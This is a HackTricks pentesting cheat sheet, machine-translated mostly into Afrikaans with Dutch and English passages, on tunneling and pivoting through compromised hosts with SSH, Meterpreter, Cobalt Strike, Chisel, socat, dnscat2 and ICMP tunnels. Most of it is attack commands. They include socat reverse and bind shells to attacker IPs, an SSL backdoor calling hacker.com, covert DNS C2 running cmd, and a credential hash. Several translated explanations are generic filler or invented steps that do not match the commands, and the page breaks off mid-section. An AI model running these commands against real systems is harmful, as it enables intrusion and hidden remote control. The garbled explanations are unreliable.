# Tunneling en Port Forwarding

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Nmap wenk

{% hint style="warning" %}
**ICMP** en **SYN** skanderings kan nie deur sokkerproksi's getunnel word nie, so ons moet **ping-ontdekking deaktiveer** (`-Pn`) en **TCP-skanderings** (`-sT`) spesifiseer vir hierdie werk.
{% endhint %}

## **Bash**

**Host -> Spring -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiese verbinding (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Plaaslike Poort-tot-Poort

Maak 'n nuwe poort oop in SSH-bediener --> Ander poort
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Poort2Poort

Lokale poort --> Gehackte host (SSH) --> Derde\_box:Poort
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokale Poort --> Gekompromitteerde gasheer (SSH) --> Waar ook al
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Omgekeerde Poortdeuring

Dit is nuttig om omgekeerde shells van interne hosts te verkrijgen via een DMZ naar jouw host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Jy benodig **root-toegang op beide toestelle** (aangesien jy nuwe interfaces gaan skep) en die sshd-konfigurasie moet root-aantekening toelaat:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Aktiveer deurstuur op die bedienerkant
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel 'n nuwe roete op die kliëntkant in
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Jy kan **deur middel van ssh** al die **verkeer** na 'n **subnetwerk** deur 'n gasheer **tunnel**.\
Byvoorbeeld, stuur al die verkeer wat na 10.10.10.0/24 gaan, deur.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Verbind met 'n privaat sleutel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Poort-tot-poort

Lokale poort --> Gekompromitteerde gasheer (aktiewe sessie) --> Derde\_kas:Poort
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) is 'n protokol wat gebruik word om 'n veilige verbinding te skep tussen 'n kliënt en 'n bediener deur middel van 'n proxy-bediening. Dit maak dit moontlik vir die kliënt om deur die bediener te kommunikeer sonder om direk met die eindbediener te skakel. SOCKS kan gebruik word vir verskeie doeleindes, insluitend die omseil van beperkings op die internet, die beskerming van privaatheid en die omleiding van verkeer.

#### SOCKS5

SOCKS5 is die mees onlangse weergawe van die SOCKS-protokol en bied 'n hoër vlak van sekuriteit en funksionaliteit as vorige weergawes. Dit ondersteun die gebruik van verskeie verbindingsprotokolle, insluitend TCP en UDP, en maak dit moontlik om verbindings te maak met enige tipe bediener. SOCKS5 kan gebruik word vir port forwarding, waardeur 'n kliënt toegang kan verkry tot dienste wat nie direk beskikbaar is nie, deur die verkeer deur die SOCKS-bediener te stuur.

#### SOCKS-proksi

'N SOCKS-proksi is 'n bediener wat SOCKS-protokol ondersteun en gebruik word om verbindings namens 'n kliënt te maak. Die kliënt stuur sy verkeer na die SOCKS-proksi, wat dit dan deurstuur na die eindbediener. Hierdie tipe proksi maak dit moontlik vir die kliënt om anoniem te bly en om beperkings op die internet te omseil. SOCKS-proksi's kan gebruik word vir verskeie doeleindes, insluitend die omleiding van verkeer, die beskerming van privaatheid en die omseil van beperkings op die internet.

#### SOCKS-bedieners

SOCKS-bedieners is bedieners wat SOCKS-proksi-dienste aanbied. Hierdie bedieners maak dit moontlik vir kliënte om verbindings te maak met die internet deur die bedieners as 'n tussenpersoon te gebruik. SOCKS-bedieners kan gebruik word vir verskeie doeleindes, insluitend die omleiding van verkeer, die beskerming van privaatheid en die omseil van beperkings op die internet.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
'n Ander manier:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS-proksi

Maak 'n poort oop in die spanbediener wat luister op alle interfaces wat gebruik kan word om die verkeer deur die beakon te **roeteer**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPoort2Poort

{% hint style="warning" %}
In hierdie geval word die **poort oopgemaak in die beacon-gashuis**, nie in die Spanbediener nie, en die verkeer word na die Spanbediener gestuur en vandaar na die aangeduide gasheer:poort.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Om op te let:

- Beacon se omgekeerde poortstuur is ontwerp om verkeer na die Spanbediener te stuur, nie vir die oordra van verkeer tussen individuele masjiene nie.
- Verkeer word binne Beacon se C2-verkeer gestuur, insluitend P2P-skakels.
- Administratiewe voorregte is nie nodig om omgekeerde poortstuur op hoë poorte te skep nie.

### rPort2Port plaaslik

{% hint style="warning" %}
In hierdie geval word die poort **op die Beacon-gashuis oopgemaak**, nie op die Spanbediener nie, en die verkeer word na die Cobalt Strike-kliënt gestuur (nie na die Spanbediener) en vandaar na die aangeduide gasheer:poort.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Jy moet 'n weblêer-tunnel oplaai: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Jy kan dit aflaai van die vrystellingsbladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Jy moet dieselfde weergawe vir klient en bediener gebruik

### sokkies
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Poort deurstuur

Port forwarding, ook bekend als poort deurstuur, is een techniek die wordt gebruikt om netwerkverkeer van een specifieke poort op een router of firewall door te sturen naar een andere poort op een ander apparaat in het netwerk. Dit stelt gebruikers in staat om toegang te krijgen tot services of applicaties die zich achter een router of firewall bevinden.

Port forwarding kan handig zijn in verschillende scenario's, zoals het hosten van een webserver op een lokaal netwerk, het opzetten van een externe toegang tot een beveiligingscamera of het spelen van multiplayer-games via het internet.

Om port forwarding in te stellen, moet je de configuratiepagina van je router of firewall openen en de juiste instellingen invoeren. Je moet de externe poort specificeren die je wilt doorsturen, de interne poort waarop de service of applicatie draait, en het interne IP-adres van het apparaat waarnaar het verkeer moet worden doorgestuurd.

Het is belangrijk om te onthouden dat port forwarding beveiligingsrisico's met zich meebrengt. Door een poort open te stellen en verkeer door te sturen, maak je de service of applicatie kwetsbaar voor aanvallen van buitenaf. Het is daarom essentieel om de nodige beveiligingsmaatregelen te nemen, zoals het gebruik van sterke wachtwoorden, het bijwerken van softwarepatches en het beperken van toegang tot alleen vertrouwde IP-adressen.

Port forwarding is een handige techniek die kan worden gebruikt om toegang te krijgen tot services of applicaties achter een router of firewall. Het is echter belangrijk om de beveiligingsrisico's te begrijpen en de nodige voorzorgsmaatregelen te nemen om je netwerk te beschermen.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Omgekeerde tonnel. Die tonnel word vanaf die slagoffer begin.\
'n Socks4 proxy word geskep op 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot deur **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind skulp

```bash
socat TCP-LISTEN:<port>,fork EXEC:"<command>"
```

Hierdie opdrag bind 'n skulp aan 'n spesifieke poort en voer 'n bevel uit wanneer 'n verbindig gemaak word.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Omgekeerde dop

'n Omgekeerde dop is 'n tegniek wat gebruik word om 'n verbinding te maak tussen 'n aanvaller se masjien en 'n teikenmasjien. Dit stel die aanvaller in staat om op afstand beheer oor die teikenmasjien te neem en opdragte uit te voer. Die omgekeerde dop kan gebruik word vir verskeie doeleindes, soos die verkryging van toegang tot 'n stelsel, die uitvoering van skadelike kode of die versameling van inligting.

Die proses van die skep van 'n omgekeerde dop behels die gebruik van 'n program of skripsie wat op die teikenmasjien uitgevoer word. Hierdie program of skripsie maak 'n verbinding met die aanvaller se masjien en stel die aanvaller in staat om op afstand opdragte uit te voer op die teikenmasjien. Die omgekeerde dop kan gebruik maak van verskillende protokolle, soos TCP of UDP, en kan deur verskeie tegnieke geïmplementeer word, soos port forwarding of tunneling.

Die omgekeerde dop is 'n kragtige tegniek wat deur aanvallers gebruik kan word om ongemerk toegang tot 'n teikenmasjien te verkry. Dit is belangrik vir beveiligingspersoneel om bewus te wees van hierdie tegniek en om gepaste maatreëls te tref om dit te voorkom.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Poort2Poort

Port2Port is 'n tegniek wat gebruik word om 'n verbinding tussen twee poorte op verskillende stelsels te skep. Dit maak dit moontlik om verkeer vanaf een poort na 'n ander te stuur, selfs as die poorte nie direk met mekaar gekoppel is nie. Hierdie tegniek word dikwels gebruik vir verskeie doeleindes, soos die omseil van vuurmuurbeperkings, die skep van 'n veilige verbinding deur 'n onveilige netwerk, of die deel van hulpbronne tussen stelsels.

Port2Port kan op verskillende maniere geïmplementeer word, insluitend die gebruik van hulpmiddels soos SSH, VPN's, of spesifieke toepassingsprotokolle soos HTTP of FTP. Die keuse van die regte metode hang af van die spesifieke vereistes en omstandighede van die situasie.

Hier is 'n paar algemene metodes vir die implementering van Port2Port:

1. **SSH-tunneling**: Hierdie metode maak gebruik van die SSH-protokol om 'n veilige verbinding tussen twee stelsels te skep. Dit kan gebruik word om verkeer vanaf 'n plaaslike poort na 'n afgeleë poort te stuur deur 'n SSH-verbindingsessie te gebruik.

2. **VPN-tunneling**: 'n Virtuele privaat netwerk (VPN) kan gebruik word om 'n veilige verbinding tussen twee stelsels te skep. Dit maak dit moontlik om verkeer vanaf een poort na 'n ander te stuur deur die VPN-infrastruktuur te gebruik.

3. **Toepassingsprotokol-tunneling**: Sommige toepassingsprotokolle, soos HTTP of FTP, maak dit moontlik om verkeer vanaf een poort na 'n ander te stuur. Hierdie metode kan gebruik word as die spesifieke toepassing hierdie funksionaliteit ondersteun.

Dit is belangrik om te onthou dat Port2Port 'n kragtige tegniek is wat met omsigtigheid gebruik moet word. Dit kan potensieel misbruik word deur kwaadwillige individue om ongemagtigde toegang tot stelsels te verkry. Dit is dus belangrik om Port2Port slegs te gebruik vir wettige en etiese doeleindes, soos toegestaan deur die toepaslike wetgewing en regulasies.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Poort-na-Poort deur sokkies

Om poort-na-poort-verbinding te maak deur middel van sokkies, kan jy die volgende stappe volg:

1. Begin deur 'n sokkies-bediener op te stel. Jy kan 'n sokkies-bediener soos **Shadowsocks** of **Squid** gebruik. Hierdie bedieners sal jou toelaat om 'n sokkies-poort op te stel wat as 'n brug sal dien vir jou poort-na-poort-verbinding.

2. Stel 'n sokkies-kliënt op jou masjien op. Jy kan 'n sokkies-kliënt soos **Proxychains** of **Proxifier** gebruik. Hierdie kliënte sal jou toelaat om jou verkeer deur die sokkies-bediener te stuur.

3. Konfigureer die sokkies-kliënt om die sokkies-bediener te gebruik. Jy sal die IP-adres en poort van die sokkies-bediener moet spesifiseer in die konfigurasie van die sokkies-kliënt.

4. Stel 'n poort-na-poort-verbinding op. Jy kan 'n hulpmiddel soos **socat** gebruik om 'n poort-na-poort-verbinding op te stel. Hierdie hulpmiddel sal die verkeer van die bronpoort na die bestemmingspoort stuur deur die sokkies-bediener.

Met hierdie metode kan jy 'n veilige en versleutelde verbinding opstel tussen twee poorte deur middel van 'n sokkies-bediener. Dit kan nuttig wees vir verskeie toepassings, soos om toegang tot beperkte hulpbronne te verkry of om jou verkeer te verberg.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter deur SSL Socat

Hierdie tegniek maak gebruik van die SSL-funksionaliteit van Socat om 'n veilige verbinding tussen die aanvaller en die slagoffer se masjien te skep. Dit maak dit moontlik om die Meterpreter-hulpmiddel te gebruik vir verdere aanvalle.

1. Begin deur Socat op die aanvaller se masjien te installeer en te konfigureer. Gebruik die volgende opdrag:

   ```
   socat openssl-listen:443,reuseaddr,fork,cert=server.pem,verify=0 -
   ```

   Hierdie opdrag stel Socat in om te luister op poort 443 en SSL te gebruik met die sertifikaat "server.pem". Die "verify=0" opsie stel Socat in om sertifikaatverifikasie te vermy.

2. Maak 'n sertifikaat met die naam "server.pem" op die aanvaller se masjien. Jy kan 'n selfondertekende sertifikaat gebruik of 'n geldige sertifikaat verkry van 'n betroubare sertifikaatowerheid.

3. Stel 'n omleiding in op die slagoffer se masjien om al die verkeer na poort 443 na die aanvaller se masjien te stuur. Jy kan hierdie omleiding instel deur gebruik te maak van 'n verskeidenheid tegnieke, soos 'n Man-in-die-Middel-aanval of 'n sosiale ingenieurswese-aanval.

4. Wanneer die slagoffer probeer om 'n verbinding na 'n webwerf te maak wat SSL gebruik, sal die verkeer na die aanvaller se masjien omgelei word.

5. Op die aanvaller se masjien, gebruik die volgende opdrag om 'n verbinding met die slagoffer se masjien te skep:

   ```
   socat openssl-connect:slagoffer_ip:443
   ```

   Vervang "slagoffer_ip" met die IP-adres van die slagoffer se masjien.

6. As alles suksesvol is, sal jy nou 'n verbinding met die slagoffer se masjien hê en kan jy die Meterpreter-hulpmiddel gebruik vir verdere aanvalle.

Hierdie tegniek maak dit moontlik om 'n veilige verbinding tussen die aanvaller en die slagoffer se masjien te skep deur die gebruik van SSL Socat. Dit bied 'n effektiewe manier om die Meterpreter-hulpmiddel te gebruik vir verdere aanvalle.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan 'n **nie-geauthentiseerde proxy** omseil deur hierdie lyn uit te voer in plaas van die laaste een in die slagoffer se konsole:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat-tunnel

**/bin/sh-konsole**

Skep sertifikate aan beide kante: Kliënt en Bediener
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Afgeleë Poort2Poort

Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvaller se gasheer.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Dit is soos 'n konsolweergawe van PuTTY (die opsies is baie soortgelyk aan 'n ssh-kliënt).

Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-kliënt is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs lokaal toeganklike poorte na 'n poort op ons masjien te stuur:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Poort2Poort

Jy moet 'n plaaslike admin wees (vir enige poort)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang oor die stelsel** hê.\
Aflaai:

1. [SocksOverRDP x64 Binêre lêers](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie instrument gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-funksie van Windows. DVC is verantwoordelik vir **tunneling pakkies oor die RDP-verbinding**.
2. [Proxifier Draagbare Binêre lêer](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** op jou kliëntrekenaar soos hier:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons **verbind** met die **slagoffer** oor **RDP** deur gebruik te maak van **`mstsc.exe`**, en ons moet 'n **venster** ontvang wat sê dat die **SocksOverRDP-inprop geaktiveer** is, en dit sal **luister** op **127.0.0.1:1080**.

**Verbind** via **RDP** en laai & voer die `SocksOverRDP-Server.exe` binêre lêer uit op die slagoffer se masjien:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat poort 1080 luister:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik **om die verkeer deur daardie poort te proxy.**

## Proksifiseer Windows GUI-programme

Jy kan Windows GUI-programme laat deur 'n proksie navigeer deur [**Proxifier**](https://www.proxifier.com/) te gebruik.\
In **Profiel -> Proksiebedieners** voeg die IP en poort van die SOCKS-bediener by.\
In **Profiel -> Proksifiseringreëls** voeg die naam van die program wat geproksifiseer moet word by en die verbindinge na die IP-adresse wat jy wil proksifiseer.

## NTLM proksy omseil

Die vorige genoemde instrument: **Rpivot**\
**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Dit verifieer teen 'n tussenpersoon en bind 'n poort lokaal wat doorgestuur word na die eksterne diens wat jy spesifiseer. Dan kan jy die gereedskap van jou keuse gebruik deur hierdie poort.\
Byvoorbeeld, dit stuur poort 443 deur.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld die slagoffer se **SSH**-diens instel om na port 443 te luister. Jy kan daaraan koppel deur die aanvaller se port 2222.\
Jy kan ook 'n **meterpreter** gebruik wat koppel aan localhost:443 en die aanvaller luister op port 2222.

## YARP

'n Omgekeerde proxy wat deur Microsoft geskep is. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is nodig in beide stelsels om tun-adaptere te skep en data tussen hulle te tunnel deur DNS-navrae.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Die tonnel sal baie stadig wees. Jy kan 'n gekomprimeerde SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Stel 'n C\&C-kanaal deur DNS op. Dit benodig nie root-voorregte nie.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om 'n dnscat2-kliënt in PowerShell te hardloop:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Poort deurstuur met dnscat**

Port forwarding is a technique used to redirect network traffic from one port to another. It can be useful in various scenarios, such as accessing a service running on a remote machine through a firewall or NAT device. One tool that can be used for port forwarding is dnscat.

Dnscat is a command-line tool that allows you to create a covert communication channel over the DNS protocol. It can be used to bypass firewalls and other network restrictions by encapsulating your traffic within DNS queries and responses.

To use dnscat for port forwarding, you need to set up a DNS server that will handle the DNS queries and responses. This server can be hosted on your local machine or on a remote server. Once the DNS server is set up, you can configure dnscat to forward traffic from a specific port to the DNS server.

Here's an example of how to set up port forwarding with dnscat:

1. Install dnscat on your machine by following the instructions provided by the tool's documentation.

2. Set up a DNS server on your machine or on a remote server. You can use tools like BIND or dnsmasq to set up a DNS server.

3. Configure the DNS server to handle the DNS queries and responses for the domain you will be using for port forwarding.

4. Start dnscat with the following command, replacing `<domain>` with the domain you configured in the previous step:

   ```
   dnscat --dns <domain>
   ```

5. Configure your firewall or NAT device to forward traffic from the desired port to the machine running dnscat.

6. Test the port forwarding by connecting to the desired service using the DNS name you configured in the previous steps.

Port forwarding with dnscat can be a powerful technique for bypassing network restrictions and accessing services running on remote machines. However, it's important to use this technique responsibly and with proper authorization.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die sokkelsproksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekodifiseer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.

## Tonnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP-tonneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is nodig in beide stelsels om tun-adaptere te skep en data tussen hulle te tunnel deur gebruik te maak van ICMP-echo-versoeke.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) is 'n instrument om oplossings aan die internet bloot te stel met een opdragreël.**
*Die blootstelling URI is soos:* **UID.ngrok.io**

### Installasie

- Skep 'n rekening: https://ngrok.com/signup
- Kliënt aflaai:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Dit is ook moontlik om verifikasie en TLS by te voeg, indien nodig.*

#### TCP-tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Blootstelling van lêers met HTTP

Om toegang te verkry tot lêers wat nie openlik beskikbaar is nie, kan jy die HTTP-protokol gebruik om dit bloot te stel. Hier is 'n paar metodes om dit te doen:

1. **Directory Listing**: As 'n webbediener directory listing toelaat, kan jy die URL van die directory gebruik om 'n lys van al die lêers in daardie directory te sien. Dit kan gedoen word deur die URL van die directory in jou webblaaier in te voer.

